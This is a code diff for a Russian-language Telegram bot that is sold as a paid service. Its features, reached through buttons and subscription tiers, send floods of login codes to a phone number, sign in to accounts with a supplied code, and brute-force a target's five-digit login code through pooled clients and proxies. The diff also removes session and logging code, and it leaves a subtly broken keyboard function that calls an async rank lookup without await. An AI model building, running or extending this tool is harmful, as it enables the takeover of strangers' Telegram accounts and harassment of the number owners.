@@ -1,5 +1,4 @@
 from telethon import TelegramClient, functions, types as telethon_types
-from telethon.sessions import StringSession
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -45,26 +44,7 @@ async def init_db():
                 user_id BIGINT PRIMARY KEY,
                 rank TEXT DEFAULT 'user',
                 expire_date TEXT,
-                added_date TEXT,
-                total_codes_sent INTEGER DEFAULT 0
-            )
-        """)
-        await conn.execute("""
-            CREATE TABLE IF NOT EXISTS sessions (
-                phone TEXT PRIMARY KEY,
-                session TEXT,
-                username TEXT,
-                first_name TEXT,
-                date TEXT
-            )
-        """)
-        await conn.execute("""
-            CREATE TABLE IF NOT EXISTS logs (
-                id SERIAL PRIMARY KEY,
-                user_id BIGINT,
-                action TEXT,
-                details TEXT,
-                date TEXT
+                added_date TEXT
             )
         """)
     print("✅ PostgreSQL подключён")
@@ -82,7 +62,8 @@ async def get_user_rank(user_id):
             return 'user', None
         return rank, expire_date
 
-async def set_user_rank(user_id, rank, expire_date=None):
+async def set_user_rank(user_id, rank, days=30):
+    expire_date = (datetime.now() + timedelta(days=days)).isoformat() if days else None
     async with db_pool.acquire() as conn:
         await conn.execute(
             "INSERT INTO users (user_id, rank, expire_date) VALUES ($1, $2, $3) ON CONFLICT (user_id) DO UPDATE SET rank = $2, expire_date = $3",
@@ -157,7 +138,7 @@ def get_working_proxy():
             return get_working_proxy()
     return None
 
-# ===== СЛОВАРЬ =====
+# ===== СЛОВАРЬ ДЛЯ БРУТФОРСА =====
 SMART_DICT = [
     "12345", "00000", "11111", "22222", "33333", "44444", "55555",
     "66666", "77777", "88888", "99999", "54321", "12340",
@@ -167,6 +148,25 @@ SMART_DICT = [
 ]
 
 # ===== КЛАВИАТУРЫ =====
+def main_keyboard(user_id):
+    builder = InlineKeyboardBuilder()
+    rank, _ = get_user_rank(user_id)
+    
+    builder.row(InlineKeyboardButton(text="📤 Отправить код", callback_data="send_code"))
+    builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
+    builder.row(InlineKeyboardButton(text="💳 Магазин", callback_data="shop"))
+    
+    if rank in ['vip', 'admin']:
+        builder.row(
+            InlineKeyboardButton(text="🔑 Вход по коду", callback_data="login_code"),
+            InlineKeyboardButton(text="⚡ Брутфорс", callback_data="bruteforce")
+        )
+    
+    if is_admin(user_id):
+        builder.row(InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel"))
+    
+    return builder.as_markup()
+
 def shop_keyboard():
     builder = InlineKeyboardBuilder()
     builder.row(
@@ -187,17 +187,6 @@ def shop_keyboard():
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
     return builder.as_markup()
 
-def get_product_links():
-    return {
-        "bruteforce": {"name": "⚡ Брутфорс 1 номер", "price": "119 ₽ (1.5$)", "link": "http://t.me/send?start=IVZJCvYwUc8C"},
-        "bruteforce_5": {"name": "⚡ Брутфорс 5 номеров", "price": "500 ₽ (6.3$)", "link": "http://t.me/send?start=IVULVz96o0NQ"},
-        "unlock": {"name": "🔓 UNLOCK месяц", "price": "99 ₽ (1.2$)", "link": "http://t.me/send?start=IVzJRBFjchnb"},
-        "unlock_forever": {"name": "🔓 UNLOCK навсегда", "price": "799 ₽ (10$)", "link": "http://t.me/send?start=IVtaoL6KvIhV"},
-        "vip": {"name": "💎 VIP месяц", "price": "199 ₽ (2.5$)", "link": "http://t.me/send?start=IV83endACqV3"},
-        "vip_forever": {"name": "💎 VIP навсегда", "price": "1999 ₽ (20$)", "link": "http://t.me/send?start=IVqj0t9rdzAH"},
-        "antibot": {"name": "🤖 АнтиБот месяц", "price": "199 ₽ (2.5$)", "link": "http://t.me/send?start=IVtaoL6KvIhV"}
-    }
-
 def admin_keyboard():
     builder = InlineKeyboardBuilder()
     builder.row(
@@ -212,13 +201,6 @@ def admin_keyboard():
         InlineKeyboardButton(text="🚫 Удалить из ЧС", callback_data="admin_remove_blacklist"),
         InlineKeyboardButton(text="📋 Пользователи", callback_data="admin_list_users")
     )
-    builder.row(
-        InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
-        InlineKeyboardButton(text="📜 Логи", callback_data="admin_logs")
-    )
-    builder.row(
-        InlineKeyboardButton(text="📨 Рассылка", callback_data="admin_notify")
-    )
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
     return builder.as_markup()
 
@@ -227,22 +209,24 @@ def back_keyboard():
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
     return builder.as_markup()
 
-def progress_bar(current, total, length=20):
-    if total == 0:
-        total = 1
-    filled = int((current / total) * length)
-    bar = '█' * filled + '░' * (length - filled)
-    percent = int((current / total) * 100)
-    return f"┃{bar}┃ {percent}%"
+def get_product_links():
+    return {
+        "unlock": {"name": "🔓 UNLOCK месяц", "price": "99 ₽", "link": "http://t.me/send?start=IVzJRBFjchnb"},
+        "unlock_forever": {"name": "🔓 UNLOCK навсегда", "price": "799 ₽", "link": "http://t.me/send?start=IVtaoL6KvIhV"},
+        "vip": {"name": "💎 VIP месяц", "price": "199 ₽", "link": "http://t.me/send?start=IV83endACqV3"},
+        "vip_forever": {"name": "💎 VIP навсегда", "price": "1999 ₽", "link": "http://t.me/send?start=IVqj0t9rdzAH"},
+        "bruteforce": {"name": "⚡ Брутфорс 1 номер", "price": "119 ₽", "link": "http://t.me/send?start=IVZJCvYwUc8C"},
+        "bruteforce_5": {"name": "⚡ Брутфорс 5 номеров", "price": "500 ₽", "link": "http://t.me/send?start=IVULVz96o0NQ"},
+        "antibot": {"name": "🤖 АнтиБот месяц", "price": "199 ₽", "link": "http://t.me/send?start=IVtaoL6KvIhV"}
+    }
 
 # ===== ПУЛ КЛИЕНТОВ =====
 class TelegramPool:
-    def __init__(self, api_keys, pool_size=10):
+    def __init__(self, api_keys, pool_size=5):
         self.api_keys = api_keys
         self.pool_size = pool_size
         self.clients = []
         self.lock = asyncio.Lock()
-        self.current_index = 0
         self.last_used = {}
     
     async def get_client(self):
@@ -269,8 +253,9 @@ class TelegramPool:
             except:
                 pass
 
-pool = TelegramPool(API_KEYS, pool_size=10)
+pool = TelegramPool(API_KEYS, pool_size=5)
 
+# ===== ОТПРАВКА КОДА =====
 async def send_code_fast_pool(phone):
     if is_phone_blacklisted(phone):
         return {"success": False, "error": "Номер в чёрном списке"}
@@ -307,7 +292,7 @@ async def send_with_smart_wait(phone, max_retries=3):
         await asyncio.sleep(3)
     return {"success": False, "error": "Превышено число попыток"}
 
-async def spam_codes(phone, count, progress_callback=None):
+async def spam_codes(phone, count):
     results = []
     sent = 0
     failed = 0
@@ -335,12 +320,11 @@ async def spam_codes(phone, count, progress_callback=None):
             failed += 1
             results.append(f"❌ Код {i+1}: {error}")
         
-        if progress_callback:
-            await progress_callback(i + 1, count)
         await asyncio.sleep(random.uniform(1.5, 3))
     
     return results, sent, failed
 
+# ===== ВХОД ПО КОДУ =====
 async def login_with_code(phone, code):
     result = await send_code_fast_pool(phone)
     if not result["success"]:
@@ -352,8 +336,7 @@ async def login_with_code(phone, code):
         client, key = await pool.get_client()
         await client.sign_in(phone=phone, code=code, phone_code_hash=hash)
         me = await client.get_me()
-        session_string = client.session.save()
-        return {"success": True, "username": me.username, "first_name": me.first_name, "phone": phone, "session": session_string}
+        return {"success": True, "username": me.username, "first_name": me.first_name, "phone": phone}
     except Exception as e:
         return {"success": False, "error": str(e)}
     finally:
@@ -371,10 +354,8 @@ async def login_with_retry(phone, code):
         await asyncio.sleep(2)
     return {"success": False, "error": "3 попытки не удались"}
 
-async def bruteforce_block_reverse(phone, hash, start, end, progress_callback=None):
-    total = end - start
-    if total == 0:
-        total = 1
+# ===== БРУТФОРС =====
+async def bruteforce_block_reverse(phone, hash, start, end):
     for idx, code in enumerate(range(start, end - 1, -1)):
         client = None
         try:
@@ -382,8 +363,6 @@ async def bruteforce_block_reverse(phone, hash, start, end, progress_callback=No
             await client.sign_in(phone=phone, code=str(code).zfill(5), phone_code_hash=hash)
             return str(code).zfill(5)
         except:
-            if progress_callback and idx % 10 == 0:
-                await progress_callback(idx + 1, total)
             continue
         finally:
             if client:
@@ -393,7 +372,7 @@ async def bruteforce_block_reverse(phone, hash, start, end, progress_callback=No
                     pass
     return None
 
-async def fast_bruteforce_reverse(phone, progress_callback=None):
+async def fast_bruteforce_reverse(phone):
     result = await send_code_fast_pool(phone)
     if not result["success"]:
         return {"success": False, "error": result["error"]}
@@ -401,15 +380,13 @@ async def fast_bruteforce_reverse(phone, progress_callback=None):
     hash = result["hash"]
     total_codes = 100000
     
-    for idx, code in enumerate(SMART_DICT[::-1]):
+    for code in SMART_DICT[::-1]:
         client = None
         try:
             client, key = await pool.get_client()
             await client.sign_in(phone=phone, code=code, phone_code_hash=hash)
             return {"success": True, "code": code, "method": "словарь"}
         except:
-            if progress_callback:
-                await progress_callback(idx + 1, len(SMART_DICT))
             continue
         finally:
             if client:
@@ -422,7 +399,7 @@ async def fast_bruteforce_reverse(phone, progress_callback=None):
     block_size = 2000
     for start in range(total_codes - 1, -1, -block_size):
         end = max(start - block_size + 1, 0)
-        tasks.append(bruteforce_block_reverse(phone, hash, start, end, progress_callback))
+        tasks.append(bruteforce_block_reverse(phone, hash, start, end))
     
     results = await asyncio.gather(*tasks)
     for r in results:
@@ -457,27 +434,8 @@ async def start(message: types.Message):
     await message.answer(
         f"⚡ ПОМОЩНИК С КОДАМИ\n\n"
         f"Твой ранг: {rank_display}",
-        reply_markup=await main_keyboard(user_id)
+        reply_markup=main_keyboard(user_id)
     )
-
-async def main_keyboard(user_id):
-    builder = InlineKeyboardBuilder()
-    rank, _ = await get_user_rank(user_id)
-    
-    builder.row(InlineKeyboardButton(text="📤 Отправить код", callback_data="send_code"))
-    builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
-    builder.row(InlineKeyboardButton(text="💳 Магазин", callback_data="shop"))
-    
-    if rank == 'vip' or rank == 'admin':
-        builder.row(
-            InlineKeyboardButton(text="🔑 Вход по коду", callback_data="login_code"),
-            InlineKeyboardButton(text="⚡ Брутфорс", callback_data="bruteforce")
-        )
-    
-    if is_admin(user_id):
-        builder.row(InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel"))
-    
-    return builder.as_markup()
 
 # ===== CALLBACK HANDLER =====
 @dp.callback_query()
@@ -494,7 +452,7 @@ async def callback_handler(callback: types.CallbackQuery):
     if data == "back":
         await callback.message.edit_text(
             "⚡ ПОМОЩНИК С КОДАМИ",
-            reply_markup=await main_keyboard(user_id)
+            reply_markup=main_keyboard(user_id)
         )
         await callback.answer()
         return
@@ -508,8 +466,7 @@ async def callback_handler(callback: types.CallbackQuery):
         rank, expire = await get_user_rank(user_id)
         rank_names = {'admin': '👑 АДМИН', 'vip': '💎 VIP', 'antibot': '🤖 АнтиБот', 'unlock': '🔓 UNLOCK', 'user': '👤 ПОЛЬЗОВАТЕЛЬ'}
         await callback.message.edit_text(
-            f"👤 ПРОФИЛЬ\n\n"
-            f"Ранг: {rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')}",
+            f"👤 ПРОФИЛЬ\n\nРанг: {rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')}",
             reply_markup=back_keyboard()
         )
         await callback.answer()
@@ -594,36 +551,9 @@ async def callback_handler(callback: types.CallbackQuery):
             users = await conn.fetch("SELECT user_id, rank FROM users")
             text = "📋 ПОЛЬЗОВАТЕЛИ:\n\n"
             for u in users:
-                status = "👑 ADMIN" if u['user_id'] == ADMIN_ID else f"{u['rank'].upper()}"
+                status = "👑 ADMIN" if u['user_id'] == ADMIN_ID else u['rank'].upper()
                 text += f"{status} — {u['user_id']}\n"
         await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
-        await callback.answer()
-        return
-    
-    if data == "admin_stats":
-        if not is_admin(user_id):
-            await callback.answer("❌ Только для админа", show_alert=True)
-            return
-        async with db_pool.acquire() as conn:
-            count = await conn.fetchval("SELECT COUNT(*) FROM users")
-        await callback.message.edit_text(f"📊 СТАТИСТИКА\n\nВсего пользователей: {count}", reply_markup=back_keyboard())
-        await callback.answer()
-        return
-    
-    if data == "admin_logs":
-        if not is_admin(user_id):
-            await callback.answer("❌ Только для админа", show_alert=True)
-            return
-        await callback.message.edit_text("📜 ЛОГИ\n\nВ разработке", reply_markup=back_keyboard())
-        await callback.answer()
-        return
-    
-    if data == "admin_notify":
-        if not is_admin(user_id):
-            await callback.answer("❌ Только для админа", show_alert=True)
-            return
-        await callback.message.edit_text("📨 Введи текст рассылки:", reply_markup=back_keyboard())
-        user_states[user_id] = {"action": "admin_notify"}
         await callback.answer()
         return
     
@@ -665,7 +595,7 @@ async def text_handler(message: types.Message):
         return
     
     if user_id not in user_states:
-        await message.answer("Используй кнопки", reply_markup=await main_keyboard(user_id))
+        await message.answer("Используй кнопки", reply_markup=main_keyboard(user_id))
         return
     
     action = user_states[user_id].get("action")
@@ -683,8 +613,7 @@ async def text_handler(message: types.Message):
             return
         try:
             target = int(text)
-            expire = (datetime.now() + timedelta(days=30)).isoformat()
-            await set_user_rank(target, 'unlock', expire)
+            await set_user_rank(target, 'unlock', 30)
             await message.answer(f"✅ {target} теперь UNLOCK")
             try:
                 await bot.send_message(target, f"⚒️ Вам выдан UNLOCK на 30 дней")
@@ -704,8 +633,7 @@ async def text_handler(message: types.Message):
             return
         try:
             target = int(text)
-            expire = (datetime.now() + timedelta(days=30)).isoformat()
-            await set_user_rank(target, 'vip', expire)
+            await set_user_rank(target, 'vip', 30)
             await message.answer(f"✅ {target} теперь VIP")
             try:
                 await bot.send_message(target, f"⚒️ Вам выдан VIP на 30 дней")
@@ -725,8 +653,7 @@ async def text_handler(message: types.Message):
             return
         try:
             target = int(text)
-            expire = (datetime.now() + timedelta(days=30)).isoformat()
-            await set_user_rank(target, 'antibot', expire)
+            await set_user_rank(target, 'antibot', 30)
             await message.answer(f"✅ {target} теперь АнтиБот")
             try:
                 await bot.send_message(target, f"⚒️ Вам выдан АнтиБот на 30 дней")
@@ -749,7 +676,7 @@ async def text_handler(message: types.Message):
             if target == ADMIN_ID:
                 await message.answer("❌ Нельзя снять админа")
             else:
-                await set_user_rank(target, 'user', None)
+                await set_user_rank(target, 'user', 0)
                 await message.answer(f"✅ Подписка снята с {target}")
                 try:
                     await bot.send_message(target, f"🚫 Ваша подписка снята")
@@ -773,27 +700,6 @@ async def text_handler(message: types.Message):
             await message.answer(f"✅ {phone} удалён из ЧС")
         else:
             await message.answer(f"❌ {phone} не найден в ЧС")
-        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
-        del user_states[user_id]
-        return
-    
-    # ===== ADMIN: РАССЫЛКА =====
-    if action == "admin_notify":
-        if not is_admin(user_id):
-            await message.answer("❌ Только для админа")
-            del user_states[user_id]
-            return
-        async with db_pool.acquire() as conn:
-            users = await conn.fetch("SELECT user_id FROM users")
-            sent = 0
-            for u in users:
-                try:
-                    await bot.send_message(u['user_id'], text)
-                    sent += 1
-                    await asyncio.sleep(0.1)
-                except:
-                    pass
-        await message.answer(f"✅ Отправлено {sent} пользователям")
         await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
         del user_states[user_id]
         return
@@ -840,7 +746,7 @@ async def text_handler(message: types.Message):
         results, sent, failed = await spam_codes(phone, count)
         await status_msg.edit_text(
             f"📨 РЕЗУЛЬТАТ\n\nНомер: {phone}\nВсего: {count}\n✅ Успешно: {sent}\n❌ Ошибок: {failed}",
-            reply_markup=await main_keyboard(user_id)
+            reply_markup=main_keyboard(user_id)
         )
         del user_states[user_id]
         return
@@ -865,9 +771,9 @@ async def text_handler(message: types.Message):
         await message.answer(f"⏳ Вход...")
         result = await login_with_retry(phone, code)
         if result["success"]:
-            await message.answer(f"✅ ВОШЁЛ\n\n👤 {result['first_name']}\n🔹 @{result['username']}", reply_markup=await main_keyboard(user_id))
+            await message.answer(f"✅ ВОШЁЛ\n\n👤 {result['first_name']}\n🔹 @{result['username']}", reply_markup=main_keyboard(user_id))
         else:
-            await message.answer(f"❌ {result['error']}", reply_markup=await main_keyboard(user_id))
+            await message.answer(f"❌ {result['error']}", reply_markup=main_keyboard(user_id))
         del user_states[user_id]
         return
     
@@ -897,11 +803,11 @@ async def text_handler(message: types.Message):
         if result["success"]:
             login_result = await login_with_code(phone, result["code"])
             if login_result["success"]:
-                await status_msg.edit_text(f"✅ КОД: {result['code']}\n✅ ВОШЁЛ: @{login_result['username']}", reply_markup=await main_keyboard(user_id))
+                await status_msg.edit_text(f"✅ КОД: {result['code']}\n✅ ВОШЁЛ: @{login_result['username']}", reply_markup=main_keyboard(user_id))
             else:
-                await status_msg.edit_text(f"✅ КОД: {result['code']}\n❌ Ошибка входа", reply_markup=await main_keyboard(user_id))
+                await status_msg.edit_text(f"✅ КОД: {result['code']}\n❌ Ошибка входа", reply_markup=main_keyboard(user_id))
         else:
-            await status_msg.edit_text(f"❌ Код не найден", reply_markup=await main_keyboard(user_id))
+            await status_msg.edit_text(f"❌ Код не найден", reply_markup=main_keyboard(user_id))
         del user_states[user_id]
         return
 
